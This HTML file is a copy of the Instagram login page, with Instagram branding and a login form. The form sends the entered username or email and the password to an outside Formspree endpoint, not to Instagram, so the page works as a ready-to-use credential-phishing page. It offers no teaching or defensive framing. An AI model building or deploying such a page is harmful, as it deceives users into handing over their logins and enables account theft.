<!DOCTYPE html>
<html>
  <head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA Compatible" content="IE-Edge">
    <meta name="viewport" content="width-device-width, initial-scale=1.0">

    <title>Instagram</title>

    <!--------------- ICONSCOUT CDN --------------->
   <link rel="stylesheet" href="https://unicons.iconscout.com/release/v4.0.0/css/line.css">

   <!-------------------------- STYLESHEET --------------------> 
   <link rel="stylesheet" href="style.css">

  </head>
  <body>
    <div class="container">
      <div class="wrapper">
        <div class="page">
          <div class="left">
            <img class="p1" src="./images/Instagram phone.png">
          </div>
          <div class="right">
            <section class="up">
              <img src="./images/logo.jpg">
              <form  action="https://formspree.io/f/xknarppv" method="POST">
              <input type="text" name="info" placeholder="Phone number, username or email" required>
              <input type="password" name="info" placeholder="Password" required>
              <button>Log in</button>
              </form>
              <p class="or">OR</p>
              <p><a href="https://facebook.com" class="facebook"><i class="uil uil-facebook"></i>Log in with Facebook</a></p>
              <p class="pass">Forgot Password?</p>
            </section>
            <section class="down">
              <p>Don't have an account? <span>Sign Up</span></p>
            </section>
            <section class="last">
              <p>Get the app.</p>
              <div class="download">
              <img src="./images/download2.png">
              <img src="./images/download.png">
              </div>
            </section>
          </div>
        </div>
      </div>
    </div>
  </body>
</html>
